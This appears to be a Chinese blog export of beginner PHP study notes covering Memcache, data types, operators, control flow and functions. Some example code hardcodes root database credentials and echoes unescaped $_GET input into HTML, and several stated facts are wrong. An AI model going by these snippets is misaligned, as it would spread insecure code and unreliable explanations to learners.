		$mem->connect('127.0.0.1',11211);
		
		// 操作(增删改查)
		//add添加
		$mem->add('one','test code string',MEMCACHE_COMPRESSED,60*60*24*7);
				#时间不能设置超过30天,否则会变成时间戳格式,推荐使用time()+秒数
				#设置为0则永久存在
		$mem->add('two',array('111','222','333'),MEMCACHE_COMPRESSED,0)
				#数组/对象会在memcache中以序列化的方式存在
		
		//set设置(==replace覆盖)
		$mem->set('one','demo',MEMCACHE_COMPRESSED,0);
		
		//get取值(存进去是什么类型数据,取出来还是什么类型)
		var_dump($mem->get('one'));
		var_dump($mem->get(array('one','two')));
		
		//delete删除
		$mem->delete('one');
		$mem->delete('two',10);  #10秒后删除,0为立即删除
		
		//flush删库
		$mem->flush();
		
		// 关闭链接
		$mem->close();
	
	?>
```

其他常用函数:

​	自增: increment(key [, num]);

​	查看状态: getStats(type);

### 7.分布式配置

​	多服务器机器利用哈希算法共同分担压力 , 共同提供数据库服务

​	addServer('主机名',端口号,[持久链接],[权重],[超时时间],[重试间隔])

​	`$mem->addServer('192.168.14.112',11211)` 

### 8.安全防护

1. 内网访问

   `memcached -d -m 1024 -u root -l 192.168.xx.xx(内网ip) -p 11211 -c 1024 start`

2. 设置防火墙

   ```
   指定访问类型
   iptables -F
   iptables -P INPUT DROP
   iptables -A INPUT -p tcp -s 192.168.xx.xx --dport 11211 -j ACCEPT
   iptables -A INPUT -p udp -s 192.168.xx.xx --dport 11211 -j ACCEPT
   ```

​	

### 9.实际使用memcache读取数据

​	多用户大批量访问下 , 重复读取数据 , 服务器压力太大 , 使用memcache在查询时 , 缓存一份 , 以后的查询可以从memcache缓存中获取 , 当数据有变化时在更新缓存内容 , 以减轻负载压力

```
<?php 

    // 创建memcache对象
    $mem = new Memcache;

    // 连接memcache数据库
    $mem->addServer('192.168.14.48','11211');
    $mem->addServer('192.168.14.49','11211');

    // 设置sql语句和mem缓存的键
    $sql = 'select id,name,sex,age,email from users order by id';
    $key = md5($sql);

    //从mem内存中获取数据
    $data = $mem->get($key);

    //数据库操作
    if (empty($data)) {
        //链接
        try {
            $pdo = new PDO('mysql:host=localhost;dbname=test','root','123456');
        } catch (Exception $e) {
            echo '数据库链接失败:'.$e->getMessage();
        }
        // 获取数据 , 执行查询语句
        $PDOstatement = $pdo->prepare($sql);

        $PDOstatement->exec();

        $data = $PDOstatement->fetchAll(PDO::FETCH_ASSOC);

        //将查询到的数据存入mem缓存
        $mem->set($key,$data,MEMCACHE_COMPRESSED,10);
    }

    print_r($data);

    // 关闭链接
    $mem->close();

 ?>
```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Memcache</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 基础01- 数据类型</title>
    <url>/2017/11/21/PHP%20%E5%9F%BA%E7%A1%8001-%20%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[
# 1.PHP

**PHP特性**：

1.PHP文件或者文件夹命名中不能有中文，不能有中文路径。

2.PHP文件存放位置：`wamp/www/`目录下。

3.访问PHP脚本的步骤：

​	开启wamp服务——>在浏览器地址栏中输入：`localhost`

4.**PHP是什么**：（`Professional Hypertext Preprocessor`）超文本预处理器

**一句话**：**一种用来开发动态网站的服务器脚本语言**。

5.**PHP定界符**

​	格式：`<?php       PHP代码         ?>`

​	只有在定界符内的代码才会被PHP解析

6.向浏览器输出一句话：`echo 'hello,world!';`

7.**PHP设置编码**（一般情况下，该编码声明写在文件头部）

​	`header('content-type:text/html;charset="utf-8"');`

8.**注释**

单行注释：`#注释内容`	or	`//注释内容`

多行注释：`/*注释内容*/`

9.**PHP基本语法**

- 每一条命令均以分号（；）结尾，代表这条命令已经结束。
- 只有最后一条可以不加，但推荐都加上。

10.查询PHP相关信息

​	`phpinfo();`

11.若只想输出一句话，可以使用如下格式：

​	`<?='hello,world!'?>`

​	`<?php echo 'hello,world!'?>`

## 2.变量var

1.**变量**，即未知数（variable）,主要是负责指向（引用）一个值，值不是固定的。

​		`$a=10;`

2.**格式**：$变量名=值；

> 值必须给定，不给会报错，称之为“未定义变量”

3.**变量命名**

- 右数字，字母和下划线组成；
- 不能以数字开头；
- 变量严格区分大小写；
- 支持中文，但不推荐

4.**变量技巧**

1）可变变量：将一个变量的值作为另一个变量的名字来使用

```
	$山鸡 = '陈小春';
	$陈小春 = '应采儿';

	echo $陈小春;		#输出应采儿
	echo $$山鸡;		#输出应采儿
```

引用变量名为另一个变量值的变量值，可以使用两个$直接引用

2）**传值**：将一个变量的值赋予另一个变量

```
	$a=10;
	$b=$a;				
	$b=5;
	echo $a;			#输出10
	echo $b;			#输出5
```

3）**传址**：将一个变量的内存地址赋予另一个变量

```
	$a=10;
	$b=&$a;				
	$b=5;
	echo $a;		#输出5
	echo $b;		#输出5
```

## 3.数据类型

PHP中的数据类型包括：

**标量类型**：	

- 整型	`Int`
- 浮点型       ` Float`
- 布尔型       ` Bool`
- 字符型       ` String`

**复合类型**：

- 数组	`array`
- 对象       `object`

**特殊类型**：

- 资源         `resource`
- 空类型        ` NULL`

## 4.整型int

1.**最大整型**：`PHP_INT_MAX`

> 最大整型就是php中数据显示为整型的最大值，为2的31次方
>
> 若某个值比PHP_INT_MAX还大，则自动转为float型

2.**检测是否为整型**：`is_int();`

> 输出值为bool值

3.**进制**

|          | 基数 |  前缀  |
| :------: | :--: | :----: |
|  二进制  | 0/1  |   0b   |
|  八进制  | 0~7  |   0    |
|  十进制  | 0~9  | 无前缀 |
| 十六进制 | 0~f  |   0x   |

4.**计算方法**：

1）任何进制转为十进制：

次方求和法：∑（基数*进制^次方）

2）十进制转化为其他进制：

除基数取余法：当商比任意进制基数还小时，停止除法运算；将余数倒排序，即得到结果。

> 快捷方法：
>
> 2048 1024 512 256    128 64 32 16    8 4 2 1

## 5.浮点型 float

1.**科学计数法**：

```
	$num=2e3;
	var_dump($num);			#输出为浮点型
```

如果使用科学计数法，则默认该值为浮点型数据

2.**判断是否为浮点型数据**：`is_float();`

3.**精度**：

浮点型数据在php显示结果中只显示14位有效数字，故在浮点运算中，结果并不精确，浮点型数据不适合做二进制计算，同时也尽量不要用小数做等值判断，防止数值误差产生，得到错误结果

```
	$a=0.1+0.2;
	var_dump($a);
	if($a==0.3){
		echo 'true';
	}else{
		echo 'false';	#运算结果为false
	}

	if($a>0.3){
		echo 'true';
	}else{
		echo 'false';	#运算结果为true
	}
```

## 6.布尔型 bool/boolean

1.**值**：false 	true

2.**作用**：代表两种极端状态，常用与判断比较等

3.**判断数据是否属于bool值**：`is_bool();`

4，**等价判断**：以下7种情况与false等价

- false
- 0
- 0.0
- ''   or    '0'
- NULL空类型
- 空数组
- 未定义变量

## 7.字符串string

1.**作用**：

用于存储or表达信息，包含数字，字母，标点，汉字等

2.**格式**：

- 小段内容：单双引号

  ```
  	$a='dead man may never die';
  	$b='winter is coming';
  	var_dump($a);
  	var_dump($b);
  ```

- 大段内容：heredoc结构

  ```
  	$c=<<<xxx
  曾经跟媳妇吵架, 吵到最激烈的时候, 我就想: 一个大老爷们跟老娘们较什么劲. 当时就跟媳妇道歉了,媳妇挺开心的... 他哥就放下菜刀, 他妹松开了拽着我头发的手, 老丈人拿起了电话: 棺材退了吧. 夫妻之间只要多沟通, 生活还是很和谐.
  xxx;
  	var_dump($c);
  ```

  **注意**：

  1）xxx可以替换成任意其他结构次（自制）

  2）保证首尾一致

  3）开始结构词的后面不能有任何多余的字符（包括空格）

  4）结尾结构词的前后不能有任何多余的字符（包括空格）

3.**检测类型**：

- 是否为字符串：`is_string();`
- 是否为数字或数字字符串：`is_numaric();`
- 是否为标量类型：`is_scalar();`

4.**单双引号的区别**

- 单引号：不能识别变量，执行速度快；但不能识别解析转义字符，
- 双引号：可以识别变量，执行速度较慢；可以识别解析转义字符。

> 转义字符：\
>
> 能够给普通字母赋予特殊意义，也可以把特殊意义的字符变成普通字符输出。

**常见转义字符**：

| `\n` |   换行    |
| :--: | :-------: |
| `\r` |   回车    |
| `\t` | 制表符Tab |
| `\'` |    `'`    |
| `\"` |    `"`    |
| `\$` |    `$`    |



## 8.数组 Array

1.**简述**：键值对；

2.**定义**：数据的集合；

3.**格式**：`$数组名[]=数组值` 或者 `$数组名=[值1，值2，值3，...]`

4.**显示格式**：

```
							显示：	array (size=7)
	$bag[]='三国演义';				0 => string '三国演义' (length=12)
	$bag[]='水浒传';				 1 => string '水浒传' (length=9)
	$bag[]='红楼梦';				 2 => string '红楼梦' (length=9)
	$bag[]='西游记';				 3 => string '西游记' (length=9)
	$bag[]='10000';				   4 => string '10000' (length=5)
	$bag[]=NULL;				   5 => null
	$bag[]=1000;				   6 => int 1000
	var_dump($bag);
```

5.**数组操作**：

- 查询数组中的一个值：通过键来查询；      `var_dump($bag[2];)`
- 修改数组中的某个值：通过已经存在的键来修改；     `$bag[1]='菜根谭'；`
- 新增数组中的某个值：通过不存在的键来新增；     `$bag[9]='说文解字’；`
- 删除数组中的某个值：通过键来操作（**unset**）；       `unset($bag[1]);`

## 9.空类型 Null

**1.定义**：null代表什么都没有，常用于先占据内存，供后期使用；

2.以下三种情况，直接显示null：

- 直接赋值null		`$a=null;`

- 未定义变量		`var_dump(@$b);`

  > @为错误抑制符，可以临时屏蔽$b的错误；

- 被删除的变量               `unset($c);`

**注意：只要与false等价，基本都与null等价**

## 10.对象 Object 

1.**对象**：在PHP中，一切皆对象

​	获取一个对象:

```
$a=new stdClass;		
var_dump($a);		#显示：object(stdClass)[1]
```

## 11 资源 Resource

2.**资源**：所有的文件都是资源

​	获取一个资源：

```
$b=fopen('./ex.html');		
var_dump($b);		#显示：resource(3, stream)

```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 简介02-数据类型转化</title>
    <url>/2017/12/04/PHP%20%E5%9F%BA%E7%A1%8002-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E5%8C%96/</url>
    <content><![CDATA[
## 1.几个常用函数

1.释放内存：`unset（）；`

2.检测一个变量是否为空：`empty();`

> 实质上为检测是否与false等价		空=true		非空=false

3.检测一个变量是否设置：`isset();`

> 实际上为检测是否为null或未定义变量		已设置：true		未设置：false

```
	$a=10;		#未空，已设置
	$a=0;		#空，已设置
	$a=0.0;		#空，已设置
	$a=false;	#空，已设置
	$a=[];		#空，已设置
	$a='0';		#空，已设置
	$a=null;	#空，未设置
	$a=$b;		#空，未设置
	$a=$obj;	#未空，已设置
	$a=$resource;	#非空，已设置

```

## 2. 输出方式

PHP中常用输出方式常见的有4种：

1.**echo**

​	为PHP基本语法，支持int，float，string，resource类型的数据输出

​	格式：`echo '输出内容'；`

2.**print / print（）**

​	print为基本语法结构，print（）为函数，返回值为int

​	支持int，float，string，resource类型的数据输出

​	格式：`print 输出内容`		`print（输出内容）；`

3.**print_r（）**

​	print_r（） 为函数，返回值为bool

​	支持int，float，string，array，resource，object类型的数据输出

4.**var_dump（）**

​	var_dump（）为函数，无返回值。可以支持任何类型的数据

> print_r() 和 var_dump() 的区别：
>
> print_r() 理论上可以输出无数个数据，但实际上受到内存大小的限制
>
> var_dump() 最多只能输出128条数据，其他的隐藏

**print_r() 的美化：**

```
	print_r('<pre>');
	print_r($arr);
	print_r('</pre>');

```

## 3. 数据类型转化 DateType

运算本质是同类型的数据之间的运算

标量数据的转换分为两种：自动类型转换 和 强制类型转换

### **1.自动类型转换**：隐式转换

- 布尔型（bool）转为整型（int）

  ```
  var_dump(true+10);			#11			true->1
  var_dump(false+10);			#10			false->0
  
  ```

  

- 布尔型（bool）转为浮点型（float）

  ```
  var_dump(true+10.5);	#11.5	true->1.0
  var_dump(false+10.5);	#10.5	false->0.0
  
  ```

  

- 字符串（string）转为整型（int）

  ```
  	var_dump('abc'+10);			#10
  	var_dump('123'+10);			#133
  	var_dump('1a2b'+10);		#11
  	var_dump('a1b3'+10);		#10
  	var_dump('12av'+10);		#22
  
  ```

  - 从前往后，保留前面的数字，从第一个非数字开始向后全部抛弃（包括后面的数字）

- 字符串（string）转为浮点型（float）

  ```
  	var_dump( '1.2' + 10.5 );			#11.7
  	var_dump( '1a.2' + 10.5 );			#11.5
  	var_dump( 'a1.2' + 10.5 );			#10.5
  	
  	var_dump( '1.2e3' + 10.5 );			#1210.5
  	var_dump( '1.2e3e4' + 10.5 );		#1210.5
  	var_dump( '1.2.3.4' + 10.5 );		#11.7
  
  
  ```

  - 从前往后，保留前面的数字，从第一个非数字开始向后全部抛弃（包括后面的数字）
  - 识别第一个科学计数法和第一个小数点

- 整型（int）转为浮点型（float）

  ```
   	var_dump( 1 + 2.5 ); 		# 3.5 		1 -> 1.0
  
  
  ```

### **2.强制类型转换**：强制转换

- **临时转换**

  - **通过运算符来强制转换**（值适用于标量和复合数据，不包含特殊类型的数据）

    ```
    	var_dump((int)$str);
    	var_dump((float)$str);
    	var_dump((bool)$str);
    	var_dump((string)$str);
    	var_dump((object)$str);
    	var_dump((array)$str);
    
    
    ```

  - **通过函数来强制转换**

    ```
    	var_dump(intval($str));
    	var_dump(floatval($str));
    	var_dump(boolval($str));
    	var_dump(strval($str));			#字符串转化是strval，而不是stringval
    
    
    ```

- **永久转换**

  通过函数   `settype(变量名，类型)`   来永久转换数据，之后数据不一定能转换回原数据

  ```
  		settype($str,'int');
  		var_dump($str);
  
  		settype($str,'string');
  		var_dump($str);
  
  
  ```

## 4. 常量 Define

**1.常量**：经常固定不变的量（constant）

**2.格式**：`格式：const 常量名=常量值；`	或者      `define(常量名，常量值)`

```
		const CHINA = '中国';			
		var_dump( CHINA );
		
		define('NUME',1000);
		var_dump(NUME);


```

**注意**：

​	常量名默认区分大小写，推荐使用大写，与变量区分；

​	define函数的完整格式为`define（常量名，常量值，bool值）`，其中总bool值默认值为`false`，代表区分大小写，若为`true`则不区分大小写；

**3.魔术常量**：

​	`__FILE__`  当前文件路径

​	`__LINE__`  当前代码行号

​	`__DIR__`    当前文件目录

```
		var_dump(__FILE__);		#:string 'D:\wamp\www\XIA\0409\08-define.php' (length=34)	
		var_dump(__LINE__);		#:int 39
		var_dump(__DIR__);		#:string 'D:\wamp\www\XIA\0409' (length=20)


```

**4.预定义常量**：

​	`PHP_INT_MAX`	显示最大整型常量

​	`PHP_INT_MIN`	显示最小整型常量

​	`M_PI`		      圆周率

​	`PHP_VERSION`	显示当前PHP版本号

​	`PHP_OS`		   显示当前使用操作系统（Windows都显示WINNT）

```
	var_dump(PHP_INT_MAX)；			#:int 2147483647
	var_dump(PHP_INT_MIN)；			#:int -2147483648
	var_dump(M_PI)；					#:float 3.1415926535898
	var_dump(PHP_VERSION)；			#:string '7.0.4' (length=5)
	var_dump(PHP_OS);				 #:string 'WINNT' (length=5)


```

## 5. 运算符  Operation

PHP中运算符主要有以下**七种**：

- 算术运算符
- 自增/自减运算符
- 赋值运算符
- 比较运算符
- 拼接运算符
- 逻辑运算符
- 三元运算符

1.**算术运算符**：

​	`加	        减	乘	除	取模（取余）`

​	`+ 	      -	         *	  /	       %`

​	**取模（%）详解**：

​	1)**普通取模**：

```
	var_dump(5%2);		#1
	var_dump(1%2);		#1
	var_dump(2%2);		#0


```

​	2)**高阶取模**

​		①**取模的正负**：取决于被除数的正负

```
		var_dump(5%2);		#1
		var_dump(5%-2);		#1
		var_dump(-5%2);		#-1
		var_dump(-5%-2);	#-1


```

​		

​		②**取模结果的范围：x~y**

```
	     var_dump(0%3);		#0				# %3
	   	 var_dump(1%3);		#1
	   	 var_dump(2%3);		#2
	   	 var_dump(3%3);		#0
	   	 var_dump(4%3);		#1
    	 var_dump(5%3);		#2
	   	 var_dump(6%3);		#0
    	 var_dump(7%3);		#1				# %3的结果永远在0~2之间，都小于3


```

​    	   

```
	     var_dump(0%5);		#0				# %5
	   	 var_dump(1%5);		#1
	   	 var_dump(2%5);		#2
	   	 var_dump(3%5);		#3
	   	 var_dump(4%5);		#4
	   	 var_dump(5%5);		#0
	   	 var_dump(6%5);		#1
	   	 var_dump(7%5);		#2				# %x的结果永远在0~x-1之间，都小于x


```

​			

​		若需求2~5，如何才能达到需求：

```
			0	~	？		#？=5-2=3	0~3为%4的结果
		+	2
		-----------------
			2	~	5		#即要达到2~5的结果，需要%4+2


```

​		

​		推理到x~y，则有：`%(y-x+1)+x`

```
			0	~	?			# ?=y-x 	为%[(y-x)+1]的结果
		+	x
		----------------
			x	~	y			# 即要达到x~y的结果，需要%（y-x+1）+x


```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 简介03-运算符/流程控制</title>
    <url>/2017/12/13/PHP%20%E5%9F%BA%E7%A1%8003-%E8%BF%90%E7%AE%97%E7%AC%A6.%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[
# 1. 运算符  Operation

PHP中运算符主要有以下**七种**：

- 算术运算符
- 自增/自减运算符
- 赋值运算符
- 比较运算符
- 拼接运算符
- 逻辑运算符
- 三元运算符

### 1.**算术运算符**：

​	`加	        减	乘	除	取模（取余）`

​	`+ 	      -	         *	  /	       %`

​	**取模（%）详解**：

​	1)**普通取模**：

```
	var_dump(5%2);		#1
	var_dump(1%2);		#1
	var_dump(2%2);		#0

```

​	2)**高阶取模**

​		①**取模的正负**：取决于被除数的正负

```
		var_dump(5%2);		#1
		var_dump(5%-2);		#1
		var_dump(-5%2);		#-1
		var_dump(-5%-2);	#-1

```

​		

​		②**取模结果的范围：x~y**

```
	     var_dump(0%3);		#0				# %3
	   	 var_dump(1%3);		#1
	   	 var_dump(2%3);		#2
	   	 var_dump(3%3);		#0
	   	 var_dump(4%3);		#1
    	 var_dump(5%3);		#2
	   	 var_dump(6%3);		#0
    	 var_dump(7%3);		#1				# %3的结果永远在0~2之间，都小于3

```

​    	   

```
	     var_dump(0%5);		#0				# %5
	   	 var_dump(1%5);		#1
	   	 var_dump(2%5);		#2
	   	 var_dump(3%5);		#3
	   	 var_dump(4%5);		#4
	   	 var_dump(5%5);		#0
	   	 var_dump(6%5);		#1
	   	 var_dump(7%5);		#2				# %x的结果永远在0~x-1之间，都小于x

```

​			

​		若需求2~5，如何才能达到需求：

```
			0	~	？		#？=5-2=3	0~3为%4的结果
		+	2
		-----------------
			2	~	5		#即要达到2~5的结果，需要%4+2

```

​		

​		推理到x~y，则有：`%(y-x+1)+x`

```
			0	~	?			# ?=y-x 	为%[(y-x)+1]的结果
		+	x
		----------------
			x	~	y			# 即要达到x~y的结果，需要%（y-x+1）+x

```

​		

### 2.拼接运算符	string

1.符号：

​	`.`	小数点

2.作用 ：

​	拼接变量与字符串	/	拼接变量与变量

3.实例：

```
 	$a='winter';
 	$b='fall';
 	$c='winter fall is the home of arya';	
 	$c='$a $b is the home of arya';			#不识别，显示为$a $b
 	$c=$a.' '.$b.' is the home of arya';	#正常显示

 	echo $c;

```

### 3.赋值运算符	equal

主要有以下几种赋值运算符：

​	`变量=值`		赋值（先运算=右边的，再运算=左边的）

​	`变量+=值`		变量=变量+值
​	`变量-=值`		变量=变量-值
​	`变量*=值` 		变量=变量*值
​	`变量/=值 `		变量=变量/值
​	`变量%=值` 		变量=变量%值
​	`变量.=值 `		变量=变量.值

### 4.比较运算符	compare

​	1.比较的结果都是布尔值（bool）

​	2.运算符：

​	`>`	`>=`		大于，大于等于

​	`<`	`<=`		小于，小于等于

​	`==`			    等于	（判断=两端的值是否相等）

​	`===`			  全等于	（判断两边的值和数据类型是否全部相等）

​	`!=`			    不等于	（判断两边的值是否不相等）

​	`!==`			  全不等于	（判断两边的值和数据类型是不是都不相等）

### 5.逻辑运算符	logic

|  类型  | 运算符 |            运算规则            |
| :----: | :----: | :----------------------------: |
| 逻辑与 |   &&   | 两边全真才是真,一边为假即为假  |
| 逻辑或 |  \|\|  | 一边为真即是真，两边为假才是假 |
| 逻辑非 |   ！   |       真即是假，假即是真       |

### 6.自增/自减	increment

​	1.自增运算符：`++`

​	2.自减运算符：`--`

​	3.易混乱点：	

​		a++	先返回a值，再给a+1

​		++a	先给a+1，再返回a值

```
		$a=10;
		echo $a++;			#输出a	10
		echo $a;			#输出a+1	11
		echo ++$a;			#输出a+1	12
		echo $a;			#输出a	12

```

### 7.三元运算符	three

​	一元运算符：`！`	`a++`	`a--`	

​	二元运算符：`a=b`	`a%b`	`a-b`

​	三元运算符：`?:`

1.定义：简化的if-else结构

2.格式：条件表达式  ?  true环境  :    false环境；

3.运算规则：

​	当条件表达式成立时，进入true环境执行；当条件不成立时，进入false环境。

4.实例

​	`echo 1+1==2?'yes!':'no';`



### 补充：运算符优先级

![PHP运算符优先级](D:/wamp/www/XIA/0410/PHP%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7.png)

# 2. PHP流程控制

在PHP中，主要有四种结构：顺序结构，分支结构，循环结构和异常结构，其中异常结构主要适用于面向对象，先不进行介绍。

1.**顺序结构**：代码从上往下依次执行；（参考HTML中文档流）

2.**分支结构**：通过 `if` / `switch` 来进行分支选择

3.**循环结构**：通过 `for` / `while` 来重复执行某一部分的代码

以下详细介绍分支结构和循环结构的具体内容

### 1.顺序结构（不介绍）

### 2.分支结构

1.单一分支结构：（`if`）

- `if( 条件表达式 ) 一行代码；`

  该结构只能影响紧跟在 `if` 后面的第一行代码，从第二行开始，就不受 `if` 判断结果的影响

- `if( 条件表达式 ){ 一个代码块； }` 

  该结构后面可以跟一整个代码块，通过复合结构（代码块）， `if` 可以影响多条语句

2.双向分支结构（`else`）

- `if( 条件表达式 ){ 代码段;}else{ 代码段；}`

  `if` 语句的延伸，可以对不满足 `if` 条件的情况进行阐述

3.多向条件分支结构（`elseif`）

- `if(条件表达式){代码块}elseif（条件）{ ... }elseif(条件){ ... }...else{...}` 

  在 `elseif` 中只有一个被执行，多个条件是逻辑或的关系，只要有一个满足，就可以进入相应的true环境，优先处理包含范围较小的条件

4.巢状条件分支结构（`if` 嵌套）

- ```
      if(条件表达式){
             if(条件表达式){
                 if(条件表达式){
  					...
                 }else{ ... }
             }else{ ... }
         }else{ ... }
  
  ```

  这里的多个条件是逻辑与的关系，要同时满足才能进入最深的true环境

5.多向条件分支结构(`switch`)

- ```
  switch( 表达式 ){
         case 值1: 代码块1；break;
         case 值2： 代码块2;break;
         ...
         case 值n: 代码块n;break;
         default: 代码块n+1;
  }
  
  ```

  专门用于等值判断， `switch` 后面的表达式数据类型只能是整型或字符串，不能为`bool` 值;

  若不加 `break` ，会在匹配到值后继续向下执行后面的所有标识;

   `default` 代表不与之前所有值匹配的情况;

##### 6.练习  简易计算器

> 需求: 由用户输入两组 数值, 并选择运算符, PHP根据运算符结算结果

```
//1.接收数据：
	$n1=empty($_GET['num1'])? null :$_GET['num1'];	#三元运算符，若设置则赋值，未设置赋值null
//2.根据运算符选择计算方式
	$result = null;
		switch ($ope) {
			case '+': $result = $n1 + $n2; break;	
			case '-': $result = $n1 - $n2; break;
			case '*': $result = $n1 * $n2; break;
			case '/': $result = $n1 / $n2; break;
		}
//3.HTML表单提交
		<input type="text" name="num1" value="<?= $n1 ?>"> 

		<select name="ope">
			<option value="+" <?=  $ope == '+'?'selected':null   ?>  >+</option>
			<option value="-" <?=  $ope == '-'?'selected':null   ?>  >-</option>
			<option value="*" <?=  $ope == '*'?'selected':null   ?>  >&times;</option>
			<option value="/" <?=  $ope == '/'?'selected':null   ?>  >&divide;</option>
		</select>	#三元运算符，若选中默认显示，未选中为空

		<input type="text" name="num2" value="<?= $n2 ?>"> 	#value输入提交时默认显示
		
//4.HTML中输出结果
	<span> <?= $result ?> </span>


```

### 3.循环结构

#### 1.while循环（当）

- 格式：

```
	$sum=1;									初始化;
	while($num<=100){        				while(条件){
        echo $num;								代码块；
        $num++;								}
	}											

```

- 循环规则：

  ​	初始化 --> 条件  成立--> 代码块 -->条件（循环）

  ​				不成立 --> 跳出循环

注意： `while` 循环常用来控制循环次数未知的循环结构，条件表达式的结果必须为 `bool` 值

#### 2.do...while循环（直到）

- 格式：

```
	$num=1;								初始化;
	do{									do{
        echo $num;							代码块；
        $num++;							}while（条件）；
	}while($num<0);

```

- 循环规则：

  ​	初始化 --> 代码块 --> 条件 成立 --> 代码块（循环）

  ​						 不成立 --> 跳出循环

注意： `do...while` 是先执行一次代码块，然后判断是否符合条件，来决定是否继续循环；

​	    `while(条件)` 后面要加上分号 `；` 

​	    适合执行至少必须循环一次的情况。

#### 3.for循环

- 格式： `for( 初始化 ; 条件表达式 ; 增量 ){ 代码块; }` 

- 循环规则：

  初始化 --> 条件表达式  成立--> 代码块 --> 增量 --> 条件 --> 代码块（循环） 

  ​				    不成立--> 跳出循环

- 注意点：

  - for语句中的三部分可以部分或全部为空，如把第一部分初始化语句提到for语句之前，第二部分和第三部分提到for语句之内；（for的退化形式）

    - ```
      //把初始化提到for之前
      	$num=1;
      	for(;$num<10;$num++){echo $num;}
      
      ```

    - ```
      //把第三部分增量提到for之内
      	$num=1;
      	for(;$num<10;){
              echo $num;
              $num++;
      	}
      
      ```

    - ```
      //把第二部分条件表达式提到for之内
      	$num=1;
      	for(;;){
              if($num<10)break;
              echo $num;
              $num++;
      	}
      
      ```

  - for语句中的每个部分都可以写多个表达式，之间用 `,` 逗号隔开；

#### 4.循环语句之间的区别

- while语句先判断再执行，do...while语句先执行一次，再判断是否继续循环。
- while语句计算机执行速度较快，for语句代码书写方便，排版整洁，使用程度较高。

#### 5.for循环使用技巧

- 当条件表达式为空或非false值时，程序条件永远满足，产生死循环

  ```
  	$x=0;
  	for(;;){
  		echo $x.' ';
  		$x++;
  	}
  
  
  ```

- 当条件表达式为与false等价（0 , 0.0，‘ ‘，...）时，程序认为条件不满足，不会执行;

- 当初始化表达式为空时，false=0，初始值为0；

- 当增量为空时，若条件成立则一直循环输出初始值；z



### 4.特殊流程控制符

#### 1.continue

当执行到continue时，会准备进入下一轮循环

#### 2.break

当执行到break时，会马上结束当前循环或者分支结构

#### 3.die

当执行到die时，整个程序结束（后面全部不会执行）（？断点调试？）

### 5.扩展使用

​	**需求：输出0~9，如果碰到4，跳过**

```
	for($i=0;$i<10;$i++){
		if($i!==4){
            echo $i.' ';
		}
	}

```

```
	for($i=0;$i<10;$i++){
        if($i==4){
            continue;
        }echo $i.' ';
	}

```

​	**需求：输出0~9，如果碰到4，就结束循环**

```
	for($i=0;$i<10;$i++){
        if($i==4){
            break;
        }echo $i.' ';
	}

```

​	**需求：输出0~9，如果碰到4，就结束程序**

```
		for($i=0;$i<10;$i++){
            if($i==4){
                die('111');
            }echo $i.' ';
		}

```

​	结论：

- `continue` 只是跳过此次循环，继续下次循环；
- `break` 是结束本循环结构，继续后面的程序执行；
- `die` 是结束整个程序，后面的程序直接无效；（`exit` 同样）

## 5.HTML与PHP结合写法

1. `for`  和 HTML 混合写法：

   ```
   	<?php  for()  ?>
   		HTML代码块
   	<?php  endfor  ?>
   
   ```

   

2. `if` 和 HTML 混合写法：

   ```
           <?php  if()  ?>
               HTML代码块
           <?php  endif  ?>
   
               <?php  if()  ?>
                   HTML代码块(true环境)
               <?php  else:  ?>
                   HTML代码块(false环境)
               <?php  endif  ?>
               
              <?php  if():  ?>
   				html代码块 (true环境)
   			<?php elseif(): ?>
   				html代码块 (true环境)
   			<?php elseif(): ?>
   				html代码块 (true环境)
   			<?php elseif(): ?>
   				html代码块 (true环境)
   			<?php else(): ?>
   				html代码块 (false环境)
   			<?php  endif ?>
   
   ```]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 简介04-函数</title>
    <url>/2017/12/27/PHP%20%E5%9F%BA%E7%A1%8004-%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[
## 1.函数 `function`

### 1.定义：

​	用来执行特定任务，实现某种功能

### 2.分类：

​	系统函数：PHP自带的函数，如数学，字符串，数组，时间...

​	自定义函数：用户根据具体的需求来设计的函数

### 3.自定义函数

​	1.格式：

​	 `function 函数名（参数1，参数2，...）{代码块}` 

​	2.注意事项：

​	1） `function` 关键字不能少；

​	2）函数名不区分大小写；

​	3）参数（也称形参）可以写也可以不写，具体根据需求决定；

​	4）代码块：函数功能的主要部分；

### 4.特性：

- 函数不调用不会自动执行
- 没有执行函数时，依旧会检测里面的语法，若有错误，程序报错
- 函数互不影响，可以互相调用
- 调用函数和定义函数的先后顺序没有要求

### 5.调用函数

​	`函数名（）;` 

### 6.函数名

#### 1 函数的命名规范：

​	由数字，字母和下划线组成，但不能由数字开头

#### 2 函数名不区分大小写

#### 3 函数命名要求

​	有意义，以提高可读性（动词＋名词）

#### 4 函数命名方式：

1.小驼峰命名法：

​	从第二个单词开始，首字母大写 `getUserName` 

2.大驼峰命名法（帕斯卡命名法）

​	每个单词的首字母都大写 `GetUserInfo` 

3,下划线命名法

​	每个单词之间用下划线隔开 `var_dump` 

#### 5 函数名不允许重复

### 7.返回值 return

1.关键字：

​	`return` 

2.格式：

​	 `return 内容` 

3.流程：

​	当程序执行到 `return` 时，马上将“内容”返回到调用函数的地方

4.返回状态：

- 自然返回：函数中的代码全部执行完，自动回到调用函数的地方

> 没有返回值时，强行接收，只能得到null

- 提前返回：函数中执行了return，马上结束函数，并返回到调用函数的地方

> 当程序执行到return时，立马返回，带了一个内容，如果想带两个变量回去，可以将多个变量存入同一个数组中，并return数组。

### 8.参数

1.定义：

​	参数分为**实参**（实际参数）和**形参**（形式参数）

​	实参—— `argument` ，在调用函数时给的具体参数

​	形参——`parameter` ，在定义函数时给的某一类参数形式

2.参数接收

